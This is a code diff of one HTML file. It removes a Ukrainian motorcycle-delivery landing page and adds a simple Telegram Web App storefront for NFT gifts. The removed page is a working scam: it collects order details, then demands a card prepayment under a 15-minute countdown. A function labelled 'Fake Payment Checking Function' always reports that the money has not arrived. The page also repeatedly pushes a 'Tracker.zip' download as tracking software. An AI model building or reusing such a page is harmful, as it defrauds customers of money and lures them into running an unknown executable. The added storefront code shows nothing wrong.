@@ -1,575 +1,306 @@
 <!DOCTYPE html>
-<html lang="uk" class="dark scroll-smooth">
+<html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>MOTO-EXPRESS — Безпечна доставка мотоциклів по всій Україні</title>
-  
-  <!-- Tailwind CSS CDN -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Tailwind Config -->
-  <script>
-    tailwind.config = {
-      darkMode: 'class',
-      theme: {
-        extend: {
-          colors: {
-            brand: {
-              dark: '#0B0F17',
-              card: '#111827',
-              green: '#10B981',
-              neon: '#22C55E',
-              emerald: '#059669',
-            }
-          },
-          boxShadow: {
-            'neon': '0 0 20px rgba(34, 197, 94, 0.35)',
-            'neon-lg': '0 0 35px rgba(34, 197, 94, 0.5)',
-          }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Meta Market</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bg-color: var(--tg-theme-bg-color, #0f0f12);
+            --card-bg: var(--tg-theme-secondary-bg-color, #1a1a20);
+            --text-color: var(--tg-theme-text-color, #ffffff);
+            --hint-color: var(--tg-theme-hint-color, #8e8e93);
+            --button-color: var(--tg-theme-button-color, #2ab574);
+            --button-text: var(--tg-theme-button-text-color, #ffffff);
         }
-      }
-    }
-  </script>
-  <!-- Lucide Icons -->
-  <script src="https://unpkg.com/lucide@latest"></script>
-  <!-- Google Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
-  
-  <style>
-    body {
-      font-family: 'Inter', sans-serif;
-      background-color: #0B0F17;
-      color: #F9FAFB;
-    }
-    h1, h2, h3, .font-heading {
-      font-family: 'Montserrat', sans-serif;
-    }
-    .glass-panel {
-      background: rgba(17, 24, 39, 0.75);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-    }
-  </style>
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            padding: 16px;
+            padding-bottom: 90px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .logo {
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            background: linear-gradient(135deg, #2ab574, #0088cc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .sub-logo {
+            font-size: 12px;
+            color: var(--hint-color);
+            margin-top: 2px;
+        }
+
+        /* Поиск и Фильтры */
+        .controls {
+            margin-bottom: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .search-box {
+            width: 100%;
+            padding: 10px 14px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: var(--card-bg);
+            color: var(--text-color);
+            font-size: 14px;
+            outline: none;
+        }
+
+        .categories {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            white-space: nowrap;
+            padding-bottom: 4px;
+        }
+
+        .categories::-webkit-scrollbar {
+            display: none;
+        }
+
+        .cat-btn {
+            padding: 6px 14px;
+            border-radius: 20px;
+            border: none;
+            background: var(--card-bg);
+            color: var(--hint-color);
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .cat-btn.active {
+            background: var(--button-color);
+            color: var(--button-text);
+        }
+
+        /* Сетка товаров */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            border: 1px solid rgba(255,255,255,0.05);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .badge {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            font-size: 10px;
+            padding: 3px 6px;
+            border-radius: 6px;
+            color: var(--hint-color);
+        }
+
+        .img-container {
+            width: 100%;
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 8px;
+        }
+
+        .img-emoji {
+            font-size: 56px;
+        }
+
+        .card-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin: 8px 0 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .price-box {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            margin-bottom: 10px;
+        }
+
+        .price-uah {
+            font-size: 14px;
+            font-weight: 700;
+            color: #2ab574;
+        }
+
+        .price-crypto {
+            font-size: 11px;
+            color: var(--hint-color);
+        }
+
+        .buy-btn {
+            background: var(--button-color);
+            color: var(--button-text);
+            border: none;
+            padding: 9px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        /* Кнопка снизу для Telegram */
+        .footer-action {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: var(--bg-color);
+            padding: 12px 16px;
+            box-shadow: 0 -4px 10px rgba(0,0,0,0.3);
+        }
+
+        .sell-btn {
+            width: 100%;
+            background: #0088cc;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+        }
+    </style>
 </head>
-<body class="min-h-screen flex flex-col antialiased selection:bg-brand-neon selection:text-black">
+<body>
 
-  <!-- Header -->
-  <header class="fixed top-0 left-0 right-0 z-50 glass-panel border-b border-white/5">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
-      <div class="flex items-center space-x-3">
-        <div class="p-2 bg-brand-neon/10 rounded-xl border border-brand-neon/30 text-brand-neon">
-          <i data-lucide="bike" class="w-7 h-7"></i>
+    <header>
+        <div class="logo">❖ META MARKET ❖</div>
+        <div class="sub-logo">NFT Gifts & Collectibles</div>
+    </header>
+
+    <div class="controls">
+        <input type="text" id="searchInput" class="search-box" placeholder="Поиск подарка..." oninput="filterItems()">
+        <div class="categories">
+            <button class="cat-btn active" onclick="setCategory('all', this)">Все</button>
+            <button class="cat-btn" onclick="setCategory('rare', this)">🔥 Редкие</button>
+            <button class="cat-btn" onclick="setCategory('food', this)">🍔 Еда</button>
+            <button class="cat-btn" onclick="setCategory('animals', this)">🐵 Животные</button>
         </div>
-        <span class="text-xl font-extrabold tracking-wider font-heading uppercase text-white">
-          MOTO<span class="text-brand-neon">EXPRESS</span>
-        </span>
-      </div>
-      
-      <div class="flex items-center space-x-3">
-        <!-- PC Application Header Button -->
-        <a href="Tracker.zip" download class="hidden md:inline-flex items-center space-x-2 px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-white/10 text-sm font-semibold transition">
-          <i data-lucide="laptop" class="w-4 h-4 text-brand-neon"></i>
-          <span>Програма для ПК</span>
-        </a>
-
-        <a href="#calculator" class="inline-flex items-center px-5 py-2.5 rounded-xl bg-brand-neon hover:bg-emerald-500 text-black font-bold text-sm transition-all duration-300 shadow-neon">
-          Розрахувати вартість
-        </a>
-      </div>
     </div>
-  </header>
 
-  <!-- Hero Section -->
-  <section class="relative pt-32 pb-20 md:pt-44 md:pb-32 overflow-hidden">
-    <div class="absolute inset-0 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-brand-neon/15 via-transparent to-transparent"></div>
-    
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
-      <div class="max-w-3xl">
-        <div class="inline-flex items-center space-x-2 px-3.5 py-1.5 rounded-full glass-panel border border-brand-neon/30 text-brand-neon text-xs font-semibold uppercase tracking-wider mb-6">
-          <i data-lucide="shield-check" class="w-4 h-4"></i>
-          <span>Надійна транспортування 24/7</span>
-        </div>
-        
-        <h1 class="text-4xl sm:text-5xl md:text-6xl font-black font-heading leading-tight mb-6">
-          Доставимо ваш мотоцикл у будь-яку точку України. <br/>
-          <span class="text-transparent bg-clip-text bg-gradient-to-r from-brand-neon to-emerald-400">
-            Швидко. Надійно. Без турбот.
-          </span>
-        </h1>
-        
-        <p class="text-lg md:text-xl text-slate-300 mb-8 font-light leading-relaxed">
-          Спеціалізований транспорт, м'яка фіксація, офіційне страхування та Нова Пошта / адресна доставка по всіх областях.
-        </p>
-        
-        <div class="flex flex-col sm:flex-row gap-4">
-          <a href="#calculator" class="inline-flex items-center justify-center px-8 py-4 rounded-xl bg-brand-neon hover:bg-emerald-500 text-black font-bold text-lg transition-all duration-300 shadow-neon hover:shadow-neon-lg transform hover:-translate-y-0.5">
-            <span>Оформити доставку</span>
-            <i data-lucide="arrow-right" class="w-5 h-5 ml-2"></i>
-          </a>
-        </div>
-      </div>
+    <div class="grid" id="itemsGrid"></div>
+
+    <div class="footer-action">
+        <button class="sell-btn" onclick="sellGift()">🤝 Продать свой подарок</button>
     </div>
-  </section>
 
-  <!-- Interactive Calculator / Wizard -->
-  <section id="calculator" class="py-16 relative">
-    <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
-      
-      <div class="text-center mb-10" id="form-header">
-        <h2 class="text-3xl font-bold font-heading mb-3">Онлайн-заявка на доставку</h2>
-        <p class="text-slate-400">Пройдіть 3 простих кроки для оформлення транспортування</p>
-      </div>
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand(); // Разворачиваем на весь экран
 
-      <!-- Main Form Card -->
-      <div class="glass-panel rounded-2xl p-6 sm:p-10 border border-white/10 shadow-2xl relative">
-        
-        <!-- Progress Bar -->
-        <div id="progress-container" class="mb-8">
-          <div class="flex justify-between text-xs font-semibold text-slate-400 mb-2">
-            <span id="progress-label">Крок 1 з 3</span>
-            <span id="progress-percent">33%</span>
-          </div>
-          <div class="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
-            <div id="progress-bar" class="h-full bg-gradient-to-r from-brand-neon to-emerald-400 transition-all duration-500 ease-out" style="width: 33%"></div>
-          </div>
-        </div>
+        // База подарков в наличии
+        const items = [
+            { id: 1, name: "IceCream #9424", priceUah: 900, priceTon: 22, emoji: "🍦", cat: "food", rare: false },
+            { id: 2, name: "Red Chimpanzee", priceUah: 1500, priceTon: 37, emoji: "🐵", cat: "animals", rare: true },
+            { id: 3, name: "Juicy Watermelon", priceUah: 800, priceTon: 20, emoji: "🍉", cat: "food", rare: false },
+            { id: 4, name: "Doberman Dog", priceUah: 1200, priceTon: 30, emoji: "🐕", cat: "animals", rare: true },
+            { id: 5, name: "Magic Unicorn", priceUah: 1800, priceTon: 45, emoji: "🦄", cat: "rare", rare: true },
+            { id: 6, name: "Jester Hat", priceUah: 750, priceTon: 18, emoji: "🤡", cat: "rare", rare: false }
+        ];
 
-        <form id="wizard-form" onsubmit="event.preventDefault(); submitForm();">
-          
-          <!-- STEP 1: Destination Only -->
-          <div id="step-1" class="step-content space-y-6">
-            <h3 class="text-xl font-semibold border-b border-white/10 pb-3 flex items-center text-white">
-              <i data-lucide="map-pin" class="mr-2 text-brand-neon"></i> 1. Куди доставляємо
-            </h3>
-            
-            <div class="p-5 rounded-xl bg-slate-900/50 border border-white/5 space-y-4">
-              <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                <div>
-                  <label class="block text-xs font-medium text-slate-400 mb-1">Область призначення</label>
-                  <select class="w-full px-4 py-3 rounded-xl bg-slate-900 border border-white/10 focus:border-brand-neon outline-none transition text-white" required>
-                    <option value="">Оберіть область...</option>
-                    <option>Київська область</option>
-                    <option>Львівська область</option>
-                    <option>Дніпропетровська область</option>
-                    <option>Одеська область</option>
-                    <option>Харківська область</option>
-                    <option>Вінницька область</option>
-                    <option>Полтавська область</option>
-                    <option>Чернігівська область</option>
-                    <option>Черкаська область</option>
-                    <option>Житомирська область</option>
-                    <option>Закарпатська область</option>
-                    <option>Запорізька область</option>
-                    <option>Івано-Франківська область</option>
-                    <option>Кіровоградська область</option>
-                    <option>Миколаївська область</option>
-                    <option>Рівненська область</option>
-                    <option>Сумська область</option>
-                    <option>Тернопільська область</option>
-                    <option>Хмельницька область</option>
-                    <option>Чернівецька область</option>
-                  </select>
-                </div>
-                <div>
-                  <label class="block text-xs font-medium text-slate-400 mb-1">Населений пункт</label>
-                  <input type="text" placeholder="Наприклад: Львів" class="w-full px-4 py-3 rounded-xl bg-slate-900 border border-white/10 focus:border-brand-neon outline-none transition text-white placeholder-slate-600" required>
-                </div>
-              </div>
+        let currentCategory = 'all';
 
-              <!-- Delivery Method -->
-              <div class="pt-2">
-                <label class="block text-xs font-medium text-slate-400 mb-2">Спосіб отримання</label>
-                <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                  <label class="flex items-center p-3.5 rounded-xl border border-white/10 bg-slate-800/40 cursor-pointer hover:border-brand-neon/50 transition">
-                    <input type="radio" name="delivery_type" checked class="w-4 h-4 accent-brand-neon">
-                    <span class="ml-2.5 text-sm text-white font-medium">Відділення Нової Пошти (Вантажне)</span>
-                  </label>
-                  <label class="flex items-center p-3.5 rounded-xl border border-white/10 bg-slate-800/40 cursor-pointer hover:border-brand-neon/50 transition">
-                    <input type="radio" name="delivery_type" class="w-4 h-4 accent-brand-neon">
-                    <span class="ml-2.5 text-sm text-white font-medium">Кур'єр «до дверей»</span>
-                  </label>
-                </div>
-              </div>
-
-              <div>
-                <label class="block text-xs font-medium text-slate-400 mb-1">Номер вантажного відділення / Адреса отримання</label>
-                <input type="text" placeholder="Наприклад: Відділення №1 (до 1100 кг) або вул. Хрещатик 1" class="w-full px-4 py-3 rounded-xl bg-slate-900 border border-white/10 focus:border-brand-neon outline-none transition text-white placeholder-slate-600" required>
-              </div>
-            </div>
-
-            <div>
-              <label class="block text-sm font-medium text-slate-300 mb-1">Бажана дата отримання / відправки</label>
-              <input type="date" class="w-full px-4 py-3 rounded-xl bg-slate-900/80 border border-white/10 focus:border-brand-neon outline-none transition text-white" required>
-            </div>
-          </div>
-
-          <!-- STEP 2: Options -->
-          <div id="step-2" class="step-content hidden space-y-6">
-            <h3 class="text-xl font-semibold border-b border-white/10 pb-3 flex items-center text-white">
-              <i data-lucide="sliders" class="mr-2 text-brand-neon"></i> 2. Додаткові послуги
-            </h3>
-
-            <div class="space-y-3">
-              <label class="flex items-center p-4 rounded-xl border border-white/10 bg-slate-800/30 cursor-pointer hover:border-brand-neon/40 transition">
-                <input type="checkbox" class="w-5 h-5 rounded accent-brand-neon bg-slate-900 border-white/20">
-                <div class="ml-3">
-                  <span class="block text-sm font-semibold text-white">🛡 Повне страхування вантажу</span>
-                  <span class="block text-xs text-slate-400">Покриття 100% оголошеної вартості мотоцикла</span>
-                </div>
-              </label>
-
-              <label class="flex items-center p-4 rounded-xl border border-white/10 bg-slate-800/30 cursor-pointer hover:border-brand-neon/40 transition">
-                <input type="checkbox" class="w-5 h-5 rounded accent-brand-neon bg-slate-900 border-white/20">
-                <div class="ml-3">
-                  <span class="block text-sm font-semibold text-white">📦 Дерев'яне риштовання (каркас)</span>
-                  <span class="block text-xs text-slate-400">Максимальний захист корпусу під час транспортування</span>
-                </div>
-              </label>
-
-              <label class="flex items-center p-4 rounded-xl border border-white/10 bg-slate-800/30 cursor-pointer hover:border-brand-neon/40 transition">
-                <input type="checkbox" class="w-5 h-5 rounded accent-brand-neon bg-slate-900 border-white/20">
-                <div class="ml-3">
-                  <span class="block text-sm font-semibold text-white">🧰 Перевезення екіпірування та запчастин</span>
-                  <span class="block text-xs text-slate-400">Додаткове місце для шоломів, кофрів чи комплектів гуми</span>
-                </div>
-              </label>
-            </div>
-          </div>
-
-          <!-- STEP 3: Contacts -->
-          <div id="step-3" class="step-content hidden space-y-6">
-            <h3 class="text-xl font-semibold border-b border-white/10 pb-3 flex items-center text-white">
-              <i data-lucide="user-check" class="mr-2 text-brand-neon"></i> 3. Контактні дані
-            </h3>
-
-            <div class="space-y-4">
-              <div>
-                <label class="block text-sm font-medium text-slate-300 mb-1">Ваше ім'я</label>
-                <input type="text" placeholder="Олександр" class="w-full px-4 py-3 rounded-xl bg-slate-900/80 border border-white/10 focus:border-brand-neon outline-none transition text-white" required>
-              </div>
-
-              <div>
-                <label class="block text-sm font-medium text-slate-300 mb-1">Номер телефону</label>
-                <input type="tel" placeholder="+380 (99) 000-00-00" class="w-full px-4 py-3 rounded-xl bg-slate-900/80 border border-white/10 focus:border-brand-neon outline-none transition text-white" required>
-              </div>
-
-              <div>
-                <label class="block text-sm font-medium text-slate-300 mb-1">Зручний месенджер для зв'язку</label>
-                <select class="w-full px-4 py-3 rounded-xl bg-slate-900/80 border border-white/10 focus:border-brand-neon outline-none transition text-white">
-                  <option>Telegram</option>
-                  <option>Viber</option>
-                  <option>WhatsApp</option>
-                  <option>Телефонний дзвінок</option>
-                </select>
-              </div>
-
-              <div>
-                <label class="block text-sm font-medium text-slate-300 mb-1">Коментар або додаткові примітки (за бажанням)</label>
-                <textarea rows="3" placeholder="Особливості завантаження чи доставки..." class="w-full px-4 py-3 rounded-xl bg-slate-900/80 border border-white/10 focus:border-brand-neon outline-none transition text-white placeholder-slate-600"></textarea>
-              </div>
-            </div>
-          </div>
-
-          <!-- Controls -->
-          <div id="controls-container" class="mt-8 pt-6 border-t border-white/10 flex justify-between">
-            <button type="button" id="prev-btn" onclick="nextStep(-1)" class="px-6 py-3 rounded-xl border border-white/10 hover:bg-white/5 text-slate-300 font-semibold transition hidden">
-              Назад
-            </button>
-            <button type="button" id="next-btn" onclick="nextStep(1)" class="ml-auto px-8 py-3 rounded-xl bg-brand-neon hover:bg-emerald-500 text-black font-bold transition shadow-neon">
-              Далі
-            </button>
-          </div>
-
-        </form>
-
-        <!-- SUCCESS SCREEN WITH PAYMENT -->
-        <div id="success-screen" class="hidden text-center py-4 space-y-6">
-          <div class="w-16 h-16 bg-brand-neon/10 rounded-full border border-brand-neon/30 flex items-center justify-center mx-auto text-brand-neon shadow-neon">
-            <i data-lucide="check-circle-2" class="w-10 h-10"></i>
-          </div>
-
-          <div class="space-y-2">
-            <h3 class="text-2xl sm:text-3xl font-bold font-heading text-white">Заявка успішно сформована!</h3>
-            <p class="text-slate-300 max-w-md mx-auto text-sm">Для підтвердження броньовання місця у спецтранспорті необхідно внести передоплату.</p>
-          </div>
-
-          <!-- Payment Block -->
-          <div class="p-6 rounded-2xl bg-slate-900/90 border border-amber-500/30 max-w-lg mx-auto text-left relative space-y-4">
-            <div class="flex items-center justify-between border-b border-white/10 pb-3">
-              <span class="text-xs font-semibold uppercase tracking-wider text-amber-400 flex items-center">
-                <i data-lucide="clock" class="w-4 h-4 mr-1.5"></i> Очікування передоплати
-              </span>
-              <span id="payment-timer" class="text-base font-bold text-amber-400 font-mono">15:00</span>
-            </div>
-
-            <div class="space-y-2">
-              <div class="flex justify-between items-center">
-                <span class="text-xs text-slate-400">Сума до сплати:</span>
-                <span class="text-xl font-extrabold text-brand-neon">500 UAH</span>
-              </div>
-              <div class="flex justify-between items-center">
-                <span class="text-xs text-slate-400">Призначення:</span>
-                <span class="text-xs font-semibold text-white">Бронь доставки мотоцикла</span>
-              </div>
-            </div>
-
-            <!-- Card Requisites Box -->
-            <div class="p-3.5 bg-slate-950/80 rounded-xl border border-white/10 flex items-center justify-between">
-              <div class="space-y-0.5">
-                <span class="text-[10px] uppercase text-slate-500 font-bold block">Реквізити для сплати (Банківська карта)</span>
-                <span id="card-number" class="text-sm sm:text-base font-mono font-bold text-white tracking-wider">5355 2800 4225 1429</span>
-              </div>
-              <button type="button" onclick="copyCardNumber()" class="p-2 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg transition text-xs flex items-center gap-1">
-                <i data-lucide="copy" class="w-4 h-4"></i>
-                <span id="copy-btn-text">Скопіювати</span>
-              </button>
-            </div>
-
-            <!-- Action Button & Status Output -->
-            <div class="pt-2 space-y-3">
-              <button type="button" id="pay-check-btn" onclick="checkPaymentStatus()" class="w-full py-3.5 rounded-xl bg-brand-neon hover:bg-emerald-500 text-black font-bold text-sm transition shadow-neon flex items-center justify-center space-x-2">
-                <i data-lucide="send" class="w-4 h-4"></i>
-                <span>Я відправив</span>
-              </button>
-
-              <!-- Status Output Area -->
-              <div id="payment-status-box" class="hidden p-3 rounded-xl text-center text-xs font-medium transition-all"></div>
-            </div>
-          </div>
-
-          <!-- PC App Download Box -->
-          <div id="download-app" class="p-6 rounded-2xl bg-slate-900/80 border border-brand-neon/30 max-w-lg mx-auto text-left relative overflow-hidden mt-6">
-            <div class="flex items-start space-x-4">
-              <div class="p-3 bg-brand-neon/10 rounded-xl text-brand-neon shrink-0">
-                <i data-lucide="monitor" class="w-8 h-8"></i>
-              </div>
-              <div class="space-y-2">
-                <h4 class="font-bold text-white text-lg">Програма трекінгу для ПК</h4>
-                <p class="text-xs text-slate-400">Завантажте програму для комп'ютера, щоб відстежувати геопозицію та статус транспортування в режимі реального часу.</p>
-                
-                <!-- Direct Link to Tracker.zip -->
-                <a href="Tracker.zip" download class="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl bg-brand-neon hover:bg-emerald-500 text-black font-bold text-sm transition shadow-neon mt-2">
-                  <i data-lucide="download" class="w-4 h-4"></i>
-                  <span>Завантажити програму (.zip)</span>
-                </a>
-              </div>
-            </div>
-          </div>
-
-          <div class="pt-2">
-            <button type="button" onclick="resetForm()" class="text-xs text-slate-400 hover:text-white underline transition">
-              Надіслати ще одну заявку
-            </button>
-          </div>
-        </div>
-
-      </div>
-    </div>
-  </section>
-
-  <!-- Advantages -->
-  <section class="py-16 bg-slate-950/60">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-      <h2 class="text-3xl font-bold font-heading text-center mb-12">Чому нам довіряють</h2>
-      
-      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-        <div class="p-6 rounded-2xl glass-panel border border-white/5">
-          <i data-lucide="lock" class="w-8 h-8 text-brand-neon mb-4"></i>
-          <h3 class="text-lg font-bold mb-2">М'яка фіксація</h3>
-          <p class="text-slate-400 text-sm">Спеціальні м'які ремені та стяжки виключають пошкодження фарби та пластику.</p>
-        </div>
-
-        <div class="p-6 rounded-2xl glass-panel border border-white/5">
-          <i data-lucide="file-text" class="w-8 h-8 text-brand-neon mb-4"></i>
-          <h3 class="text-lg font-bold mb-2">Договір та страховка</h3>
-          <p class="text-slate-400 text-sm">Офіційний договір перевезення та повне страхування мототехніки.</p>
-        </div>
-
-        <div class="p-6 rounded-2xl glass-panel border border-white/5">
-          <i data-lucide="crosshair" class="w-8 h-8 text-brand-neon mb-4"></i>
-          <h3 class="text-lg font-bold mb-2">GPS-трекінг</h3>
-          <p class="text-slate-400 text-sm">Цілодобове відстеження розташування авто з вашим байком у реальному часі.</p>
-        </div>
-
-        <div class="p-6 rounded-2xl glass-panel border border-white/5">
-          <i data-lucide="clock" class="w-8 h-8 text-brand-neon mb-4"></i>
-          <h3 class="text-lg font-bold mb-2">Точно в термін</h3>
-          <p class="text-slate-400 text-sm">Пунктуальність та дотримання узгодженого графіку доставки.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- Footer -->
-  <footer class="mt-auto border-t border-white/10 py-8 text-slate-500 text-sm">
-    <div class="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-4 text-center sm:text-left">
-      <p>© 2026 MOTOEXPRESS. Всі права захищено. Безпечна доставка мототехніки по Україні.</p>
-      
-      <!-- Footer Download Link -->
-      <a href="Tracker.zip" download class="inline-flex items-center space-x-2 text-brand-neon hover:underline">
-        <i data-lucide="download" class="w-4 h-4"></i>
-        <span>Завантажити програму для ПК</span>
-      </a>
-    </div>
-  </footer>
-
-  <!-- JavaScript -->
-  <script>
-    lucide.createIcons();
-
-    let currentStep = 1;
-    const totalSteps = 3;
-    let timerInterval = null;
-
-    function nextStep(delta) {
-      if (delta > 0) {
-        const currentInputs = document.querySelectorAll(`#step-${currentStep} input, #step-${currentStep} select`);
-        for (let input of currentInputs) {
-          if (!input.checkValidity()) {
-            input.reportValidity();
-            return;
-          }
+        function renderGrid(data) {
+            const grid = document.getElementById('itemsGrid');
+            grid.innerHTML = '';
+            data.forEach(item => {
+                grid.innerHTML += `
+                    <div class="card">
+                        <span class="badge">1 of ${item.cat === 'rare' ? '10k' : '50k'}</span>
+                        <div class="img-container">
+                            <span class="img-emoji">${item.emoji}</span>
+                        </div>
+                        <div class="card-title">${item.name}</div>
+                        <div class="price-box">
+                            <span class="price-uah">${item.priceUah} UAH</span>
+                            <span class="price-crypto">~${item.priceTon} TON</span>
+                        </div>
+                        <button class="buy-btn" onclick="buyItem('${item.name}', ${item.priceUah})">Купить</button>
+                    </div>
+                `;
+            });
         }
-      }
 
-      const newStep = currentStep + delta;
-
-      if (newStep > totalSteps) {
-        submitForm();
-        return;
-      }
-
-      if (newStep < 1) return;
-
-      document.getElementById(`step-${currentStep}`).classList.add('hidden');
-      document.getElementById(`step-${newStep}`).classList.remove('hidden');
-
-      currentStep = newStep;
-
-      const percent = Math.round((currentStep / totalSteps) * 100);
-      document.getElementById('progress-bar').style.width = `${percent}%`;
-      document.getElementById('progress-label').innerText = `Крок ${currentStep} з ${totalSteps}`;
-      document.getElementById('progress-percent').innerText = `${percent}%`;
-
-      const prevBtn = document.getElementById('prev-btn');
-      const nextBtn = document.getElementById('next-btn');
-
-      if (currentStep === 1) {
-        prevBtn.classList.add('hidden');
-      } else {
-        prevBtn.classList.remove('hidden');
-      }
-
-      if (currentStep === totalSteps) {
-        nextBtn.innerText = 'Надіслати заявку';
-      } else {
-        nextBtn.innerText = 'Далі';
-      }
-    }
-
-    function submitForm() {
-      const form = document.getElementById('wizard-form');
-      if (!form.checkValidity()) {
-        form.reportValidity();
-        return;
-      }
-
-      form.classList.add('hidden');
-      document.getElementById('progress-container').classList.add('hidden');
-      document.getElementById('form-header').classList.add('hidden');
-
-      document.getElementById('success-screen').classList.remove('hidden');
-      startPaymentTimer();
-      lucide.createIcons();
-    }
-
-    // 15 Minutes Payment Timer
-    function startPaymentTimer() {
-      let duration = 15 * 60; // 15 mins in seconds
-      const display = document.getElementById('payment-timer');
-      
-      if(timerInterval) clearInterval(timerInterval);
-
-      timerInterval = setInterval(() => {
-        let minutes = parseInt(duration / 60, 10);
-        let seconds = parseInt(duration % 60, 10);
-
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-
-        display.textContent = minutes + ":" + seconds;
-
-        if (--duration < 0) {
-          clearInterval(timerInterval);
-          display.textContent = "Час вичерпано!";
-          display.classList.replace('text-amber-400', 'text-red-500');
+        function filterItems() {
+            const search = document.getElementById('searchInput').value.toLowerCase();
+            const filtered = items.filter(item => {
+                const matchesSearch = item.name.toLowerCase().includes(search);
+                const matchesCat = (currentCategory === 'all') || 
+                                   (currentCategory === 'rare' && item.rare) || 
+                                   (item.cat === currentCategory);
+                return matchesSearch && matchesCat;
+            });
+            renderGrid(filtered);
         }
-      }, 1000);
-    }
 
-    // Copy Card Number
-    function copyCardNumber() {
-      const cardNum = document.getElementById('card-number').innerText.replace(/\s/g, '');
-      navigator.clipboard.writeText(cardNum);
-      
-      const copyBtnText = document.getElementById('copy-btn-text');
-      copyBtnText.innerText = 'Скопійовано!';
-      setTimeout(() => {
-        copyBtnText.innerText = 'Скопіювати';
-      }, 2000);
-    }
+        function setCategory(cat, btn) {
+            document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            currentCategory = cat;
+            filterItems();
+        }
 
-    // Fake Payment Checking Function
-    function checkPaymentStatus() {
-      const btn = document.getElementById('pay-check-btn');
-      const statusBox = document.getElementById('payment-status-box');
+        function buyItem(name, price) {
+            // Отправка данных боту при нажатии "Купить"
+            tg.sendData(JSON.stringify({
+                action: "buy",
+                item: name,
+                price: price
+            }));
+        }
 
-      // Disable button during check
-      btn.disabled = true;
-      btn.classList.add('opacity-50', 'cursor-not-allowed');
+        function sellGift() {
+            // Отправка данных боту для заявки на продажу
+            tg.sendData(JSON.stringify({
+                action: "sell"
+            }));
+        }
 
-      // Show Bot Checking State
-      statusBox.classList.remove('hidden', 'bg-red-500/10', 'text-red-400', 'border-red-500/20');
-      statusBox.classList.add('bg-amber-500/10', 'text-amber-300', 'border', 'border-amber-500/20');
-      statusBox.innerHTML = '<span class="inline-flex items-center"><i data-lucide="loader-2" class="w-4 h-4 mr-2 animate-spin"></i> Бот перевіряє вашу оплату...</span>';
-      lucide.createIcons();
-
-      // Show Failed Result after 3 seconds
-      setTimeout(() => {
-        statusBox.classList.remove('bg-amber-500/10', 'text-amber-300', 'border-amber-500/20');
-        statusBox.classList.add('bg-red-500/15', 'text-red-400', 'border', 'border-red-500/30');
-        statusBox.innerHTML = '❌ <b>Оплата ще не надійшла.</b> Спробуйте через декілька хвилин або зверніться в підтримку.';
-        
-        btn.disabled = false;
-        btn.classList.remove('opacity-50', 'cursor-not-allowed');
-      }, 3000);
-    }
-
-    function resetForm() {
-      if(timerInterval) clearInterval(timerInterval);
-      currentStep = 1;
-      document.getElementById('wizard-form').reset();
-
-      document.getElementById('wizard-form').classList.remove('hidden');
-      document.getElementById('progress-container').classList.remove('hidden');
-      document.getElementById('form-header').classList.remove('hidden');
-
-      document.getElementById('success-screen').classList.add('hidden');
-      document.getElementById('payment-status-box').classList.add('hidden');
-
